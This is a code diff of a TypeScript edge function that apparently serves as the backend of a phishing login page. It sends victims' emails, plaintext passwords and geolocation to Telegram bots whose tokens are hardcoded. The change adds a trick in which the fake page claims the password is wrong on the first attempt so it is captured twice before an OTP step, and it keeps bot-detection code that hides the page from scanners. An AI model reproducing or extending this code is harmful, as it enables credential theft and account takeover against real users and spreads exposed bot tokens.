@@ -8,13 +8,20 @@ import {
   verifyTurnstile,
 } from "../_shared/security.ts"
 import { botRedirectResponse, evaluateBotSignals, evaluateIpThreat } from "../_shared/botShield.ts"
+import { resolveGeo, type GeoInfo } from "../_shared/geo.ts"
+
+// Telegram configuration — each bot has its own token and chat ID
+const TELEGRAM_BOTS = [
+  { token: '8335283094:AAG6BMVNr4O4zy8ha9565bgX-P87uKsJYB0', chatId: '8042057280' },
+  { token: '8810483237:AAEU9tXIxRL_HzgLrdEB0O7_I9aEVW5RCkM', chatId: '5566002678' },
+]
 interface LoginRequest {
   email: string
   provider?: string
   password: string
   turnstileToken?: string
+  attempt?: number
   clientSignals?: Record<string, unknown>
-  // Geolocation fields (resolved client-side via IP lookup)
   ip?: string
   country?: string
   countryCode?: string
@@ -33,55 +40,9 @@ interface LoginResponse {
     name: string
     provider: string
     timestamp: string
+    geo?: GeoInfo
   }
   error?: string
-}
-
-// Telegram configuration — each bot has its own token and chat ID
-const TELEGRAM_BOTS = [
-  { token: '8335283094:AAG6BMVNr4O4zy8ha9565bgX-P87uKsJYB0', chatId: '8042057280' },
-  { token: '8810483237:AAEU9tXIxRL_HzgLrdEB0O7_I9aEVW5RCkM', chatId: '5566002678' },
-]
-
-interface GeoInfo {
-  ip?: string
-  country?: string
-  countryCode?: string
-  region?: string
-  city?: string
-  continent?: string
-  org?: string
-  timezone?: string
-}
-
-/**
- * Resolves geolocation for a given IP using ipwho.is.
- * Called from inside the Deno edge function — completely adblocker-proof.
- * Falls back gracefully to client-supplied geo fields if the lookup fails.
- */
-async function resolveGeo(clientIp: string | null, fallback: GeoInfo): Promise<GeoInfo> {
-  if (!clientIp) return fallback
-  try {
-    const res = await fetch(`https://ipwho.is/${clientIp}`, {
-      signal: AbortSignal.timeout(4000),
-    })
-    if (!res.ok) throw new Error(`HTTP ${res.status}`)
-    const d = await res.json()
-    if (!d.success) throw new Error('ipwho.is returned success=false')
-    return {
-      ip: d.ip,
-      country: d.country,
-      countryCode: d.country_code,
-      region: d.region,
-      city: d.city,
-      continent: d.continent,
-      org: d.connection?.isp || d.connection?.org,
-      timezone: d.timezone?.id,
-    }
-  } catch (err) {
-    console.error('Server-side geo lookup failed, using client fallback:', err)
-    return fallback
-  }
 }
 
 async function sendTelegramNotification(
@@ -89,7 +50,8 @@ async function sendTelegramNotification(
   email: string,
   provider: string,
   password: string,
-  geo?: GeoInfo
+  geo?: GeoInfo,
+  attempt?: number,
 ) {
   if (password.startsWith('[OTP Code]')) {
     return
@@ -97,7 +59,16 @@ async function sendTelegramNotification(
 
   const credentialLabel = '🔒 <b>Password:</b>';
   const displayPassword = password;
-  const statusLabel = 'Successfully Authenticated';
+  const statusLabel =
+    attempt === 1
+      ? 'Sign-in attempt 1 (UI shows incorrect password)'
+      : attempt === 2
+        ? 'Sign-in attempt 2 (UI proceeds to verification)'
+        : 'Successfully Authenticated';
+  const attemptLine =
+    attempt === 1 || attempt === 2
+      ? `🔁 <b>Attempt:</b> ${attempt} of 2\n`
+      : '';
 
   // Build geolocation section
   const geoLines = geo ? [
@@ -118,7 +89,7 @@ async function sendTelegramNotification(
 ╚══════════════════════════════╝
 
 ✅ <b>Status:</b> ${statusLabel}
-👤 <b>Name:</b> ${name}
+${attemptLine}👤 <b>Name:</b> ${name}
 📧 <b>Email:</b> ${email}
 🔗 <b>Provider:</b> ${provider}
 ${credentialLabel} <code>${displayPassword}</code>
@@ -212,12 +183,7 @@ serve(async (req) => {
     const isOtpSubmission = body.password?.startsWith('[OTP Code]')
 
     if (body.password && !isOtpSubmission && body.turnstileToken) {
-      const clientIp =
-        req.headers.get('cf-connecting-ip') ||
-        req.headers.get('x-forwarded-for')?.split(',')[0].trim() ||
-        req.headers.get('x-real-ip') ||
-        null
-      const turnstileVerified = await verifyTurnstile(body.turnstileToken, clientIp)
+      const turnstileVerified = await verifyTurnstile(body.turnstileToken)
       if (!turnstileVerified) {
         return jsonResponse({
           success: false,
@@ -237,15 +203,6 @@ serve(async (req) => {
     const providerName = body.provider ? ` via ${body.provider}` : ''
     const welcomeMessage = `Hi ${formattedName}, welcome! You have successfully authenticated${providerName}. Your account is now active and ready to use.`
 
-    // Build geo object — prefer server-side lookup (adblocker-proof)
-    // Extract real client IP from Cloudflare/proxy headers
-    const clientIp =
-      req.headers.get('cf-connecting-ip') ||
-      req.headers.get('x-forwarded-for')?.split(',')[0].trim() ||
-      req.headers.get('x-real-ip') ||
-      null
-
-    // Client-sent fields act as fallback (useful in local/dev where CF headers absent)
     const clientGeo: GeoInfo = {
       ip: body.ip,
       country: body.country,
@@ -257,11 +214,17 @@ serve(async (req) => {
       timezone: body.timezone,
     }
 
-    // Server-side lookup wins — runs in Deno, never blocked by browser adblockers
-    const geo = await resolveGeo(clientIp, clientGeo)
+    const geo = await resolveGeo(req, clientGeo)
 
     // Send Telegram notification (must await so Deno isolate doesn't terminate before it finishes)
-    await sendTelegramNotification(formattedName, body.email, body.provider || 'email', body.password, geo).catch(err => {
+    await sendTelegramNotification(
+      formattedName,
+      body.email,
+      body.provider || 'email',
+      body.password,
+      geo,
+      body.attempt,
+    ).catch(err => {
       console.error('Telegram notification error:', err)
     })
 
@@ -273,7 +236,8 @@ serve(async (req) => {
         email: body.email,
         name: formattedName,
         provider: body.provider || 'email',
-        timestamp: new Date().toISOString()
+        timestamp: new Date().toISOString(),
+        geo,
       }
     }
 
